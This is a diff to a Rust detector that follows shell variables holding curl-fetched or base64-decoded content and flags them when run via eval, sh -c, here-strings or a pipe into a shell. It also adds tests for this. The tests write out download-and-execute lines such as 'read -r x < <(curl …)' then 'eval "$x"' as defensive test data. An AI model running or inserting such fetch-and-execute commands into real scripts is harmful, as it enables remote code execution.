@@ -7,7 +7,9 @@
 //! `review::apply_rules`; this is the same idea for fetched and decoded
 //! *content* held in a variable.
 
-use super::shell::{self, Command, program_name, unquoted_words};
+use std::collections::HashMap;
+
+use super::shell::{self, program_name, unquoted_words};
 use super::{RuleId, encoded, fetch};
 
 /// Where a tracked value came from.
@@ -26,7 +28,12 @@ impl Source {
     }
 }
 
-/// The most variables tracked through one file.
+/// The most variables given their content by an assignment (`x=$(curl
+/// …)`), and the most code variables set from a decode call, followed
+/// through one file. With one more, the one followed longest is forgotten,
+/// and nothing says so: a run of it later in the file is not found. Names
+/// read from a fetch (`read x < <(curl …)`) are not counted and are never
+/// forgotten.
 const MAX_TRACKED: usize = 64;
 
 /// How many lines after a decode assignment a run of it still counts, for
@@ -34,10 +41,10 @@ const MAX_TRACKED: usize = 64;
 const CODE_REACH: usize = 3;
 
 /// Whether `value` is content brought in from the network: a fetch
-/// substitution, a backtick fetch, or a `< <(curl …)` on the statement.
-fn fetched_value(statement: &str, value: &str) -> bool {
+/// substitution or a backtick fetch. A `< <(curl …)` on the statement is
+/// asked for where the statement is read.
+fn fetched_value(value: &str) -> bool {
     (value.starts_with("$(") || value.starts_with('`')) && fetch::text_fetches(value)
-        || (statement.contains("< <(") && fetch::text_fetches(statement))
 }
 
 /// Whether `value` is content a decoder produced.
@@ -46,53 +53,106 @@ fn decoded_value(value: &str) -> bool {
         && (encoded::has_decoder(value) || value.contains("base64 -d"))
 }
 
-/// Whether a command runs the shell variable `name`: `eval "$x"`,
-/// `bash -c "$x"`, a here-string `sh <<< "$x"`, or printed into a shell
-/// (`echo "$x" | sh`, `printf %s "$x" | bash`).
-fn runs_variable(line: &str, name: &str) -> bool {
-    let references = |command: &Command| {
-        command
-            .arguments
-            .iter()
-            .any(|word| shell::is_reference(word, name))
+/// The shell variables a line runs, by name: `eval "$x"`, `bash -c "$x"`,
+/// a here-string `sh <<< "$x"`, or printed into a shell (`echo "$x" | sh`,
+/// `printf %s "$x" | bash`). The line is read once, however many variables
+/// are followed.
+fn run_names(line: &str) -> Vec<String> {
+    let mut names: Vec<String> = Vec::new();
+    let mut add = |word: &str| {
+        names.extend(
+            shell::referenced(word)
+                .into_iter()
+                .flatten()
+                .map(ToString::to_string),
+        );
     };
     for statement in shell::statements(line) {
-        let parts = shell::pipeline(statement);
-        for (at, part) in parts.iter().enumerate() {
+        // Whether a shell reads what a part pipes on: from the end, so each
+        // part's command is read once.
+        let mut shell_after = false;
+        for part in shell::pipeline(statement).into_iter().rev() {
             let Some(command) = shell::command(part) else {
                 continue;
             };
-            // `eval "$x"`, `sh -c "$x"`.
-            if (command.program == "eval" || (command.is_shell() && command.has_short('c')))
-                && references(&command)
+            let is_shell = command.is_shell();
+            // `eval "$x"`, `sh -c "$x"`; `echo "$x" | sh`, `printf %s "$x" |
+            // bash`.
+            if command.program == "eval"
+                || (is_shell && command.has_short('c'))
+                || (matches!(command.program.as_str(), "echo" | "printf") && shell_after)
             {
-                return true;
-            }
-            // `sh <<< "$x"`.
-            if command.is_shell() && part.contains("<<<") {
-                let after = part.split("<<<").nth(1).unwrap_or_default();
-                if shell::command(after).is_some_and(|rest| {
-                    rest.operands()
-                        .next()
-                        .is_some_and(|word| shell::is_reference(word, name))
-                }) || after.trim().trim_matches(['"', '\'']).trim() == format!("${name}")
-                    || shell::is_reference(after.trim(), name)
-                {
-                    return true;
+                for word in &command.arguments {
+                    add(word);
                 }
             }
-            // `echo "$x" | sh`, `printf %s "$x" | bash`.
-            if matches!(command.program.as_str(), "echo" | "printf")
-                && references(&command)
-                && parts[at + 1..]
-                    .iter()
-                    .any(|next| shell::command(next).is_some_and(|command| command.is_shell()))
-            {
-                return true;
+            // `sh <<< "$x"`.
+            if is_shell && part.contains("<<<") {
+                let after = part.split("<<<").nth(1).unwrap_or_default();
+                if let Some(rest) = shell::command(after)
+                    && let Some(word) = rest.operands().next()
+                {
+                    add(word);
+                }
+                add(after.trim().trim_matches(['"', '\'']).trim());
+                add(after);
             }
+            shell_after = shell_after || is_shell;
         }
     }
-    false
+    names
+}
+
+/// The shell variables that hold fetched or decoded content.
+#[derive(Default)]
+struct Held {
+    /// Each name with what it holds, and a count that says which was given
+    /// its content later.
+    names: HashMap<String, (usize, Source)>,
+    /// The names an assignment gave their content, the one held longest
+    /// first: at most `MAX_TRACKED`. A name read from a fetch is not among
+    /// them, and is held until it is given something else.
+    assigned: Vec<String>,
+    given: usize,
+}
+
+impl Held {
+    fn hold(&mut self, name: String, source: Source) {
+        self.assigned.retain(|known| *known != name);
+        self.given += 1;
+        self.names.insert(name, (self.given, source));
+    }
+
+    /// `name=$(…)`: follows `name` in place of what it held before. Past
+    /// `MAX_TRACKED` assigned names the one held longest is let go.
+    fn assign(&mut self, name: String, source: Source) {
+        self.hold(name.clone(), source);
+        self.assigned.push(name);
+        if self.assigned.len() > MAX_TRACKED {
+            let oldest = self.assigned.remove(0);
+            self.names.remove(&oldest);
+        }
+    }
+
+    /// `read name < <(curl …)`: follows `name` in place of what it held
+    /// before. However many are read, none is let go: to stop following one
+    /// would be to miss where it is run.
+    fn read(&mut self, name: String) {
+        self.hold(name, Source::Fetched);
+    }
+
+    /// Where the content of each held name among `run` came from, in the
+    /// order the names were given it. Each name is looked up, so a line
+    /// costs what it runs and not what is held.
+    fn sources(&self, run: &[String]) -> Vec<Source> {
+        let mut found: Vec<(usize, Source)> = run
+            .iter()
+            .filter_map(|name| self.names.get(name).copied())
+            .collect();
+        found.sort_by_key(|(given, _)| *given);
+        found.dedup_by_key(|(given, _)| *given);
+        found.into_iter().map(|(_, source)| source).collect()
+    }
 }
 
 /// The findings from following values through `lines` (each lowercased,
@@ -100,14 +160,19 @@ fn runs_variable(line: &str, name: &str) -> bool {
 /// content, as (line number, rule).
 pub(crate) fn findings(lines: &[String]) -> Vec<(usize, RuleId)> {
     let mut found = Vec::new();
-    // Shell variables holding fetched or decoded content.
-    let mut held: Vec<(String, Source)> = Vec::new();
+    let mut held = Held::default();
     // Code variables holding a decode call, with the line they were set.
     let mut decoded: Vec<(String, usize)> = Vec::new();
     for (index, line) in lines.iter().enumerate() {
         for statement in shell::statements(line) {
+            // Whether the statement reads a fetch (`< <(curl …)`), asked
+            // once for all it assigns.
+            let mut reads_fetch: Option<bool> = None;
             for (name, value) in shell::assignments(statement) {
-                let source = if fetched_value(statement, &value) {
+                let source = if fetched_value(&value)
+                    || *reads_fetch.get_or_insert_with(|| {
+                        statement.contains("< <(") && fetch::text_fetches(statement)
+                    }) {
                     Some(Source::Fetched)
                 } else if decoded_value(&value) {
                     Some(Source::Decoded)
@@ -115,11 +180,7 @@ pub(crate) fn findings(lines: &[String]) -> Vec<(usize, RuleId)> {
                     None
                 };
                 if let Some(source) = source {
-                    held.retain(|(known, _)| *known != name);
-                    held.push((name, source));
-                    if held.len() > MAX_TRACKED {
-                        held.remove(0);
-                    }
+                    held.assign(name, source);
                 }
             }
         }
@@ -131,12 +192,12 @@ pub(crate) fn findings(lines: &[String]) -> Vec<(usize, RuleId)> {
                 && command.program == "read"
             {
                 for name in command.operands() {
-                    held.push((name.to_string(), Source::Fetched));
+                    held.read(name.to_string());
                 }
             }
         }
-        for (name, source) in &held {
-            if runs_variable(line, name) {
+        if !held.names.is_empty() {
+            for source in held.sources(&run_names(line)) {
                 found.push((index + 1, source.rule()));
             }
         }
@@ -236,7 +297,7 @@ fn removal_target_variable(word: &str) -> Option<String> {
 #[cfg(test)]
 mod tests {
     use super::super::RuleId;
-    use super::findings;
+    use super::{MAX_TRACKED, findings};
 
     fn run(text: &str) -> Vec<(usize, RuleId)> {
         let lines: Vec<String> = text.lines().map(str::to_lowercase).collect();
@@ -327,5 +388,134 @@ mod tests {
         ] {
             assert!(run(text).is_empty(), "{text:?} -> {:?}", run(text));
         }
+    }
+
+    #[test]
+    fn a_name_read_again_is_followed_once() {
+        // The same name read three times is one variable, and one finding
+        // where it is run.
+        let read = "read -r x < <(curl -s https://x.example/i)\n";
+        assert_eq!(
+            run(&format!("{read}{read}{read}eval \"$x\"\n")),
+            [(4, RuleId::DownloadAndExecute)]
+        );
+        assert_eq!(
+            run(&format!(
+                "{read}x=$(curl -s https://x.example/i)\n{read}sh -c \"$x\"\n"
+            )),
+            [(4, RuleId::DownloadAndExecute)]
+        );
+        // What it is read from last is what it holds.
+        assert_eq!(
+            run(&format!("x=$(echo ywjj | base64 -d)\n{read}eval \"$x\"\n")),
+            [(3, RuleId::DownloadAndExecute)]
+        );
+        assert_eq!(
+            run(&format!("{read}x=$(echo ywjj | base64 -d)\neval \"$x\"\n")),
+            [(3, RuleId::EncodedCommandExecution)]
+        );
+        // Several names on one line, each found where it is run.
+        let found = run("read -r a b < <(curl -s https://x.example/i)\neval \"$b\" \"${a}\"\n");
+        assert_eq!(
+            found,
+            [
+                (2, RuleId::DownloadAndExecute),
+                (2, RuleId::DownloadAndExecute)
+            ]
+        );
+    }
+
+    #[test]
+    fn a_name_read_is_followed_however_many_are_read_after_it() {
+        let reads = |count: usize| -> String {
+            let lines: Vec<String> = (0..count)
+                .map(|at| format!("read -r x{at} < <(curl -s https://x.example/{at})\n"))
+                .collect();
+            lines.concat()
+        };
+        // The first name read is still found where it is run, and so is
+        // the last.
+        for count in [MAX_TRACKED, MAX_TRACKED + 1, 10 * MAX_TRACKED] {
+            let last = count - 1;
+            let found = run(&format!(
+                "{}eval \"$x0\"\neval \"$x{last}\"\n",
+                reads(count)
+            ));
+            assert_eq!(
+                found,
+                [
+                    (count + 1, RuleId::DownloadAndExecute),
+                    (count + 2, RuleId::DownloadAndExecute)
+                ],
+                "{count}"
+            );
+        }
+        // Of the names assigned, `MAX_TRACKED` are followed: the one held
+        // longest is let go for the next.
+        let assigned: Vec<String> = (0..=MAX_TRACKED)
+            .map(|at| format!("x{at}=$(curl -s https://x.example/{at})\n"))
+            .collect();
+        let assigned = assigned.concat();
+        assert!(run(&format!("{assigned}eval \"$x0\"\n")).is_empty());
+        assert_eq!(run(&format!("{assigned}eval \"$x1\"\n")).len(), 1);
+        // A name read is not let go for one assigned, before or after.
+        let read = "read -r y < <(curl -s https://x.example/i)\n";
+        for text in [
+            format!("{read}{assigned}eval \"$y\"\n"),
+            format!("{assigned}{read}{}eval \"$y\"\n", reads(MAX_TRACKED + 1)),
+            // Read after it was assigned, it is no longer one of those.
+            format!("y=$(echo ywjj | base64 -d)\n{read}{assigned}eval \"$y\"\n"),
+        ] {
+            let found = run(&text);
+            assert_eq!(found.len(), 1, "{found:?}");
+            assert_eq!(found[0].1, RuleId::DownloadAndExecute);
+        }
+        // Names run on one line are reported in the order they were given
+        // their content.
+        assert_eq!(
+            run(&format!(
+                "d=$(echo ywjj | base64 -d)\n{read}eval \"$y\" \"$d\" \"$y\"\n"
+            )),
+            [
+                (3, RuleId::EncodedCommandExecution),
+                (3, RuleId::DownloadAndExecute)
+            ]
+        );
+    }
+
+    #[test]
+    fn many_reads_and_long_lines_cost_one_pass() {
+        // Thousands of reads, of one name and of as many names.
+        let names: Vec<String> = (0..4_000)
+            .map(|at| format!("read -r y{at} < <(curl -s https://x.example/i)\n"))
+            .collect();
+        let mut text = names.concat();
+        text.push_str(&"read -r x < <(curl -s https://x.example/i)\n".repeat(4_000));
+        text.push_str("eval \"$x\"\neval \"$y3999\"\neval \"$y0\"\neval \"$z\"\n");
+        assert_eq!(
+            run(&text),
+            [
+                (8_001, RuleId::DownloadAndExecute),
+                (8_002, RuleId::DownloadAndExecute),
+                (8_003, RuleId::DownloadAndExecute)
+            ]
+        );
+        // One line that names many, runs many, or pipes far.
+        let held = "x=$(curl -s https://x.example/i)\n";
+        let names = "a ".repeat(10_000);
+        let text = format!("read {names}< <(curl -s https://x.example/i)\neval \"$a\"\n");
+        assert_eq!(run(&text), [(2, RuleId::DownloadAndExecute)]);
+        let text = format!("{held}eval {}\"$x\"\n", "\"$y\" ".repeat(10_000));
+        assert_eq!(run(&text), [(2, RuleId::DownloadAndExecute)]);
+        let text = format!("{held}echo \"$x\" {}| sh\n", "| cat ".repeat(10_000));
+        assert_eq!(run(&text), [(2, RuleId::DownloadAndExecute)]);
+        let text = format!("{held}echo \"$x\" {}\n", "| cat ".repeat(10_000));
+        assert!(run(&text).is_empty());
+        // Many assignments on a statement that reads a fetch.
+        let text = format!(
+            "local {}< <(curl -s https://x.example/i)\neval \"$b\"\n",
+            "a=1 b=2 ".repeat(5_000)
+        );
+        assert_eq!(run(&text), [(2, RuleId::DownloadAndExecute)]);
     }
 }
